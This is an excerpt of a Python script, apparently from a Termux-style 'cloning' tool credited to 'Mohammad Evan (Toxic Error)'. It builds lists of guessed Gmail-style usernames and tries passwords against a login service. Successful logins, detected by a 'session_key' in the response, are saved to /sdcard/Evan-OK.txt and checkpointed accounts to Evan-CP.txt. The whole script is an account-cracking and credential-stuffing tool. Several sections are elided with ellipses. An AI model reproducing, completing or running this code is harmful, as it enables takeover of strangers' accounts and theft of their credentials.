...
░░ ▒░ ░  ░ ▐░   ▒▒   ▓▒█░░ ▒░   ▒ ▒ 
 ░ ░  ░  ░ ░░    ▒   ▒▒ ░░ ░░   ░ ▒░
   ...
   ░  ░     ░        ░  ░         ░ 
           ░                        
\033[1;93m=================================
\033[1;97m Owner  : Mohammad Evan (Toxic Error) :/
\033[1;97m GitHub : mr-error2-0 :/
...
def gmail():     
        ...
        for xd in range(int(limit)):
            ...
            if '3' in lchoice:
                ...
                open('.Evan','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            fo = open('.Evan', 'r').read().splitlines()
     ...
     try:
      ...
      #      print(response.text)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mEvan-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                open('/sdcard/Evan-OK.txt','a').write(f'{acc} • {pword}\n')
                if c=='y':
                    try:
                ...
                if cpok=='n':
                     ...
                     print('\r\033[1;91m[\033[1;97mEvan-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')
                cpacc.append(acc)
                open('/sdcard/Evan-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1
